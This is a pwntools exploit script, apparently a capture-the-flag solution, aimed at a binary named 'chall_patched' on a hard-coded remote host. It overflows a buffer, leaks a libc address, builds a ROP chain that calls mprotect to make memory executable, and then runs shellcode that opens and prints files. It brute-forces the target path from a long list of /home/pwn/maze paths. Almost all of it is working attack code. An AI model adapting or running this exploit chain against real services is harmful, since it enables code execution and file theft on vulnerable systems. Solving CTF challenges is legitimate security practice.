#!/bin/python
from pwn import *
import re
import string
exe = ELF('./chall_patched')
libc = ELF('./libc.so.6')

# p = process(exe.path)
# context.terminal = ['alacritty', '-e']
# gdb.attach(p, gdbscript='''
# # b*0x401100
#            b*0x000000000040148c
# b*read+16
#            ''')
#################exploiting#####################
shellcode = asm('''

    mov rdi, rax 
    mov rdx, 100 
    mov rsi, 0x0000000000404000 
    mov rax, 0x0
    syscall


    mov rdx, rax  
    mov rax, 0x3
    syscall  

    mov    rsi, 0x0000000000404000 
    mov    rdi,1 
    mov    rax, 0x1 
    mov   rdx,100 
	syscall   
   
    


                ''',arch = 'amd64')



pop_rdi_rsi_rdx = 0x00000000004014d9
read_plt  = 0x401100
printf_plt = 0x4010e0
fake_rbp = 0x4010e0
rw_section = 0x0000000000404a00 
rw_section2 = 0x0000000000404b00
rw_section3 = 0x0000000000404c00 
container =0x0000000000404048 
ret = 0x0000000000401526
leave_ret = 0x000000000040148c 
#####################################3
for i in range(0,256):

    p = remote('3.75.185.198',10000)
    payload = b'A'*32
    payload += p64(rw_section) 
    payload += p64(pop_rdi_rsi_rdx) + p64(container) + p64(0) + p64(0) + p64(ret) 
    payload += p64(printf_plt)  
    payload +=  p64(pop_rdi_rsi_rdx) +p64(0) + p64(rw_section) + p64(0x1000)  +p64(read_plt) + p64(leave_ret)  

    p.sendlineafter(b'Input:', payload)
    p.recvuntil(b' ')
    leak_addr =u64(p.recv(6) + b'\x00\x00')
    log.info(f'leak_addr: {hex(leak_addr)}')
    libc.address = leak_addr - 0x1147d0 
    pop_rax = libc.address +0x0000000000045eb0  
    syscall = libc.address +0x1147e0
    pop_rdi = libc.address + 0x000000000002a3e5 
    pop_rsi = libc.address + 0x000000000002be51 
    pop_rdx = libc.address + 0x0000000000170337 
    mov_rdi_rax = libc.address + 2 
    path_to_target =  0x0000000000404a4e
    push_rax = libc.address + 0x0000000000041563
    shell_section = 0x0000000000402698
    ###############################33


    log.info(f'libc.address: {hex(libc.address)}')
    log.info(f'syscall: {hex(syscall)}')
    # log.info(f'stack: {hex(stack)}')

    ####################


    folder= b'/home/pwn/maze/8vUjuxi8DNSVu\x00\x00\x00/home/pwn/maze/Dm588lF27x6n\x00\x00\x00\x00/home/pwn/maze/yfTzRnj2bDU\x00\x00\x00\x00\x00/home/pwn/maze/Jy6hLbbuhqWS9UJj/home/pwn/maze/XSJ4PciaPdSd\x00\x00\x00\x00/home/pwn/maze/m9lqam3T\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/ANiprwD9MZa69\x00\x00\x00/home/pwn/maze/edpRUL22\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/PhqvP90WnCZaXA\x00\x00/home/pwn/maze/BplFtRO5mM\x00\x00\x00\x00\x00\x00/home/pwn/maze/uTe3HaCRoUac7V\x00\x00/home/pwn/maze0x0000000000404000/iVmm8Jj1W932\x00\x00\x00\x00/home/pwn/maze/qk3D6zUu\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/YRaLAr2hp\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/h3Tu3EjR7xB0\x00\x00\x00\x00/home/pwn/maze/gGqpvbwlEcN6rJ2a/home/pwn/maze/wGkPjAvDey\x00\x00\x00\x00\x00\x00/home/pwn/maze/oELuAwsCKpkkIg\x00\x00/home/pwn/maze/y35b6RM2aQ9TOf\x00\x00/home/pwn/maze/vwW9BYLQu2XCU\x00\x00\x00/home/pwn/maze/w98TNZbM\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/AfMiqJJAGZH7Ka\x00\x00/home/pwn/maze/0y17lyxHl7\x00\x00\x00\x00\x00\x00/home/pwn/maze/JfuN1BtLZyF8\x00\x00\x00\x00/home/pwn/maze/ORvzkSClTm2BRgJJ/home/pwn/maze/PYIGPj2yj\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/yPXm15vkD6K\x00\x00\x00\x00\x00/home/pwn/maze/Vry32Eeg\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/Opr1vFaW11OiA\x00\x00\x00/home/pwn/maze/WXURMleDlyxQPNr\x00/home/pwn/maze/ezXBzxIR3PBoNJ\x00\x00/home/pwn/maze/0u0Ti3tKFvjcLQ\x00\x00/home/pwn/maze/mKa80IILF\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/Bf6TIW9n3\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/UB5rt5MQcompC\x00\x00\x00/home/pwn/maze/u2bFnwxpuXeih\x00\x00\x00/home/pwn/maze/y6kt7yjWc\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/st\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/REkgCk0zsset\x00\x00\x00\x00/home/pwn/maze/ZjZjTRiy1W4dOQJA/home/pwn/maze/ZZ5Aw3HueAUxl\x00\x00\x00/home/pwn/maze/BL3D5ST3Un\x00\x00\x00\x00\x00\x00/home/pwn/maze/PddvOOotvrmt4ap\x00/home/pwn/maze/YxKSKQRDfaww0\x00\x00\x00/home/pwn/maze/7k1DPfbvhhKE479\x00/home/pwn/maze/U4nWpFR33\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/D6DeYMt68L4\x00\x00\x00\x00\x00/home/pwn/maze/ZZoTqh8pq5\x00\x00\x00\x00\x00\x00/home/pwn/maze/5tauHCDL9ScM6\x00\x00\x00/home/pwn/maze/HwJPFovPQ3y47\x00\x00\x00/home/pwn/maze/h1iFBIFFK58\x00\x00\x00\x00\x00/home/pwn/maze/erGerM3haTcN9\x00\x00\x00/home/pwn/maze/eqbDMNHXxJKlUe\x00\x00/home/pwn/maze/1fnUWAwO\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/vtvjAlCgdV99q\x00\x00\x00/home/pwn/maze/z9JTcWirnABzn7\x00\x00/home/pwn/maze/GKVAcYpboXD\x00\x00\x00\x00\x00/home/pwn/maze/atUPNaaw\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/YR5BmSqBDi\x00\x00\x00\x00\x00\x00/home/pwn/maze/VBZte4wtFKGjHG\x00\x00/home/pwn/maze/myjXp5AmNMLbB\x00\x00\x00/home/pwn/maze/rgnWzrSgLdD\x00\x00\x00\x00\x00/home/pwn/maze/xNKic0BnqA0WBRuE/home/pwn/maze/WEX2gbNTbct2tF\x00\x00/home/pwn/maze/NhCuOrGJ7nH0G\x00\x00\x00/home/pwn/maze/dECms2A6q1Y0JH\x00\x00/home/pwn/maze/YCOslGYHEMqHp\x00\x00\x00/home/pwn/maze/pfHvs2Q0nn8UqJ\x00\x00/home/pwn/maze/XEbM7ITSpP5RL\x00\x00\x00/home/pwn/maze/iTFZ9Uw32izN\x00\x00\x00\x00/home/pwn/maze/SENTyhBQAO\x00\x00\x00\x00\x00\x00/home/pwn/maze/tqrFtAxWimNPEI\x00\x00/home/pwn/maze/tJPQlU00gVHtqelQ/home/pwn/maze/cSMXACQvcDKjRvlR/home/pwn/maze/yQ57xCFLr8BS\x00\x00\x00\x00/home/pwn/maze/10FSA1FsbW\x00\x00\x00\x00\x00\x00/home/pwn/maze/Pki8g9fTbRG\x00\x00\x00\x00\x00/home/pwn/maze/um1bzjwJY\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/RdLGQzRg4Lz9IZ\x00\x00/home/pwn/maze/BOeETsd01Mtj\x00\x00\x00\x00/home/pwn/maze/XCWmXcmu0XNiTp\x00\x00/home/pwn/maze/5Fp1RkvPRaaeWzs\x00/home/pwn/maze/64jwKPaPB6weeed\x00/home/pwn/maze/1QUO6X9RXt\x00\x00\x00\x00\x00\x00/home/pwn/maze/jD1hQKvBJX\x00\x00\x00\x00\x00\x00/home/pwn/maze/YlMssZS1KPZIRGa\x00/home/pwn/maze/IhK4lU4wb\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/AwFDVhYkW\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/mgiILDxFID0gsee\x00/home/pwn/maze/OWbstCiFM3amff\x00\x00/home/pwn/maze/2EeIx9NHUqtSrg\x00\x00/home/pwn/maze/6156Lkyvqq\x00\x00\x00\x00\x00\x00/home/pwn/maze/pZ4cZEQ0B4yvhi\x00\x00/home/pwn/maze/cUYebnxu5nj\x00\x00\x00\x00\x00/home/pwn/maze/QBnbS9CmXmVml\x00\x00\x00/home/pwn/maze/KxUGYFhZkGQFKCUm/home/pwn/maze/UBlCm76Jqbno\x00\x00\x00\x00/home/pwn/maze/4DTlH6Fkp\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/K4CCheFd6zZ5tq\x00\x00/home/pwn/maze/ggM5l7s7NSaK7r\x00\x00/home/pwn/maze/RiHd1eimYGlzg\x00\x00\x00/home/pwn/maze/0dRroYfzu\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/RowitBQYXeemLXhv/home/pwn/maze/dyTdQdF8ZM4\x00\x00\x00\x00\x00/home/pwn/maze/hDOFlPI0Y3QJ6Sx\x00/home/pwn/maze/cCQMrRW0Dy\x00\x00\x00\x00\x00\x00/home/pwn/maze/GMsgFLUMUzatz\x00\x00\x00/home/pwn/maze/ikfG8aQgbxU\x00\x00\x00\x00\x00/home/pwn/maze/QQTYjMf6bD1\x00\x00\x00\x00\x00/home/pwn/maze/qht4rrxUBsLk\x00\x00\x00\x00/home/pwn/maze/3UKQmviLJr9vr\x00\x00\x00/home/pwn/maze/zGs6SvnpG7nlXfnf/home/pwn/maze/7Kic7U04z\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/soAku44Mbp71cgl\x00/home/pwn/maze/ECNNoa7eNqz2Uff\x00/home/pwn/maze/XBYUy8ogtYH\x00\x00\x00\x00\x00/home/pwn/maze/kONjNoFZEnnn5zpH/home/pwn/maze/WQPXqAdb\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/PiX9NXhoT\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/ea9kahppvH\x00\x00\x00\x00\x00\x00/home/pwn/maze/nQpQbVLf7m\x00\x00\x00\x00\x00\x00/home/pwn/maze/LHJ3OkKPkX9nrt\x00\x00/home/pwn/maze/Hz\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/DfTImGcH6et\x00\x00\x00\x00\x00/home/pwn/maze/zaa7OrwQZVBu\x00\x00\x00\x00/home/pwn/maze/zemwc5phefOrDacF/home/pwn/maze/WqputTM9Hj\x00\x00\x00\x00\x00\x00/home/pwn/maze/3KwrNTjkqDXh7JW\x00/home/pwn/maze/CQGXO6NtEreDyQi\x00/home/pwn/maze/TrcYdi8M5yjGZ\x00\x00\x00/home/pwn/maze/jjvDl6QPBbp8inHH/home/pwn/maze/g2yW5Bivgy0wWH\x00\x00/home/pwn/maze/Q8m7awS5vjH\x00\x00\x00\x00\x00/home/pwn/maze/EwMhnfiJdpHo\x00\x00\x00\x00/home/pwn/maze/58bTrN76T4uVSY3\x00/home/pwn/maze/Drf07GYCH7\x00\x00\x00\x00\x00\x00/home/pwn/maze/IOXkNf9iN2a1oO\x00\x00/home/pwn/maze/jBeDZ8ftlsbMbT6\x00/home/pwn/maze/OufzQ6rHzyq3w5Kv/home/pwn/maze/zzAyw3Z5v9\x00\x00\x00\x00\x00\x00/home/pwn/maze/nrTNa31lVo0t\x00\x00\x00\x00/home/pwn/maze/6MYbNnkXrd9\x00\x00\x00\x00\x00/home/pwn/maze/KJZPs1HZ\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/pCZwcBLfCWt\x00\x00\x00\x00\x00/home/pwn/maze/zeeelFJ50TVNv\x00\x00\x00/home/pwn/maze/vi5UVnRK9\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/rzwAWzF4HIkXIX9\x00/home/pwn/maze/R1Qak4EWIDs1assU/home/pwn/maze/nZoBTTmxAjRX\x00\x00\x00\x00/home/pwn/maze/ZvZ12a9z\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/sZfBxQWWQGCG2RD\x00/home/pwn/maze/GMsxzLv61JcJpP\x00\x00/home/pwn/maze/RAKKS6Ovq7joP\x00\x00\x00/home/pwn/maze/gqXTvzmRjDtZF7\x00\x00/home/pwn/maze/rYj2m5Yu\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/QwCkTBHPYrSlfvCQ/home/pwn/maze/habPhjCVompLFl\x00\x00/home/pwn/maze/kbWIScbjG48\x00\x00\x00\x00\x00/home/pwn/maze/a4Wev5czR76o\x00\x00\x00\x00/home/pwn/maze/yqjh97ZqT6cS\x00\x00\x00\x00/home/pwn/maze/bE7RoQoDc6S\x00\x00\x00\x00\x00/home/pwn/maze/Fs8dft8tss\x00\x00\x00\x00\x00\x00/home/pwn/maze/JrXlnlWJtk\x00\x00\x00\x00\x00\x00/home/pwn/maze/l5NcFmBe2M\x00\x00\x00\x00\x00\x00/home/pwn/maze/mHi6IliCjUS\x00\x00\x00\x00\x00/home/pwn/maze/8ogRk5KGtkgoV\x00\x00\x00/home/pwn/maze/UDUwCIdj1CtbuC1\x00/home/pwn/maze/CHwwmuHDsXpR8F\x00\x00/home/pwn/maze/lS6YvIcD0osBP8v\x00/home/pwn/maze/sDBupA0Ib8\x00\x00\x00\x00\x00\x00/home/pwn/maze/DpaTCkhLGWffJGf\x00/home/pwn/maze/ShWCyvvo\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/HD3HJoeI\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/Sj3kku9Z\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/wDPQfNLJh\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/2pXku9ow4w1eKP\x00\x00/home/pwn/maze/MDmO9WWfi\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/2vSXT0QbyIwZf1u\x00/home/pwn/maze/7BZ8E5qI6R7i\x00\x00\x00\x00/home/pwn/maze/yHe8foUYhVn\x00\x00\x00\x00\x00/home/pwn/maze/U828HRZ3CKKdc\x00\x00\x00/home/pwn/maze/wTis6B3V\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/tIoBkjY4\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/0Usc6xRB6siSVe\x00\x00/home/pwn/maze/xjIN2k0ucr\x00\x00\x00\x00\x00\x00/home/pwn/maze/NzYftOCuZipB\x00\x00\x00\x00/home/pwn/maze/QhdfSuBbj\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/ZTZ68yVg\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/8rBO32utx3sRsb\x00\x00/home/pwn/maze/WBBkYeqzQk\x00\x00\x00\x00\x00\x00/home/pwn/maze/yPpp24rs6\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/0FTpoPw6kRIPbSz\x00/home/pwn/maze/dx78VuxBJJYlb\x00\x00\x00/home/pwn/maze/wHuza5wfHssl\x00\x00\x00\x00/home/pwn/maze/3huCzrygP3DwtaG7/home/pwn/maze/CPywIvFv\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/eeNJPqS3uAu\x00\x00\x00\x00\x00/home/pwn/maze/BTWGEAhLLeL\x00\x00\x00\x00\x00/home/pwn/maze/8tSeyimXyoNMeKz8/home/pwn/maze/Wqbk2iQV0\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/tMPcPGveaUS224KB/home/pwn/maze/DBATMbc3VzRCL\x00\x00\x00/home/pwn/maze/HbOdEJQen53Ps\x00\x00\x00/home/pwn/maze/Fhd1IBrAMy\x00\x00\x00\x00\x00\x00/home/pwn/maze/ZMuSxkWh9m\x00\x00\x00\x00\x00\x00/home/pwn/maze/48b3TekC8fRu\x00\x00\x00\x00/home/pwn/maze/i451XhWBPLR2M\x00\x00\x00/home/pwn/maze/LW3VEF7foF3eq\x00\x00\x00/home/pwn/maze/FbC9fWfL\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/OwvS5wrvjI8CY3fs/home/pwn/maze/15WTSp6tM82\x00\x00\x00\x00\x00/home/pwn/maze/sNVHYVt3srLY5wKf/home/pwn/maze/SNyaSZPmSvReCI\x00\x00/home/pwn/maze/IIAkpxoS6qUYXTMD/home/pwn/maze/R1e7iTPGIYqpm\x00\x00\x00/home/pwn/maze/8nh3Wq3gzlzPOUD\x00/home/pwn/maze/ad\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/D6ZPxYGjmDS\x00\x00\x00\x00\x00/home/pwn/maze/hNiiCd6rbzAS7R\x00\x00/home/pwn/maze/jOaaiN7nfmT\x00\x00\x00\x00\x00/home/pwn/maze/m30i1hDE9MI1OAY\x00/home/pwn/maze/N9Ys1nRqs3nw\x00\x00\x00\x00/home/pwn/maze/7stUnQub0f\x00\x00\x00\x00\x00\x00/home/pwn/maze/xyDqZLSPXwfs9jKz/home/pwn/maze/YoLRbjdvap\x00\x00\x00\x00\x00\x00/home/pwn/maze/yv85uxqxw\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/WkGgzEo7GSh01w\x00\x00/home/pwn/maze/EqRHPScEC74V\x00\x00\x00\x00/home/pwn/maze/9WXqOcUddVp9z\x00\x00\x00/home/pwn/maze/rY3ZS23Lm9wx\x00\x00\x00\x00/home/pwn/maze/7lkCAN1x2ImsVPDE/home/pwn/maze/ZnGZlCV5u2\x00\x00\x00\x00\x00\x00/home/pwn/maze/0RNF0qEkf\x00\x00\x00\x00\x00\x00\x00/home/pwn/maze/kwY3SpStl\x00\x00\x00\x00\x00\x00\x00' 



    shell_addr = 0x404a5e        #rbp


    payload = p64(0x00000000004032ed)
    ###########################
    payload += p64(pop_rax)+ p64(0xa)
    payload += p64(pop_rdi) + p64(0x0000000000404000)
    payload += p64(pop_rsi) + p64(0x1000)
    payload += p64(pop_rdx) + p64(7)
    payload += p64(syscall) 
    payload += b'a'*6
    payload += p64(pop_rax)+ p64(0xa)
    payload += p64(pop_rdi) + p64(0x0000000000403000)
    payload += p64(pop_rsi) + p64(0x1000)
    payload += p64(pop_rdx) + p64(7)
    payload += p64(syscall) 
    payload += b'a'*6
    payload += p64(pop_rax)+ p64(0xa)
    payload += p64(pop_rdi) + p64(0x0000000000402000)
    payload += p64(pop_rsi) + p64(0x1000)
    payload += p64(pop_rdx) + p64(7)
    payload += p64(syscall) 
    payload += b'a'*6
    payload += p64(pop_rax)+ p64(0xa)
    payload += p64(pop_rdi) + p64(0x0000000000400000)
    payload += p64(pop_rsi) + p64(0x1000)
    payload += p64(pop_rdx) + p64(7)
    payload += p64(syscall) 
    payload += b'a'*6
    payload += p64(pop_rax)+ p64(0xa)
    payload += p64(pop_rdi) + p64(0x0000000000401000)
    payload += p64(pop_rsi) + p64(0x1000)
    payload += p64(pop_rdx) + p64(7)
    payload += p64(syscall) 
    payload += b'a'*6
    payload +=  p64(pop_rdi_rsi_rdx) +p64(0) + p64(0x0000000000401685) + p64(0x3a98)  +p64(read_plt) + p64(0x0000000000401525)
    p.send(payload)

    payload = p64(0x0000000000403475)
    payload += folder
    payload += p64(pop_rax)+ p64(0x2) 
    payload += p64(pop_rdi) + p64(0x000000000040168d +i*32) 
    payload += p64(pop_rsi) + p64(0x0)
    payload += p64(pop_rdx) + p64(0x0)
    payload += p64(syscall)
    payload += b'a'*6
    payload +=p64(0x40334b)
    payload += shellcode

    input()
    p.sendline(payload)
    p.interactive()
    

# print(cleanlmao)

##############the end###########################
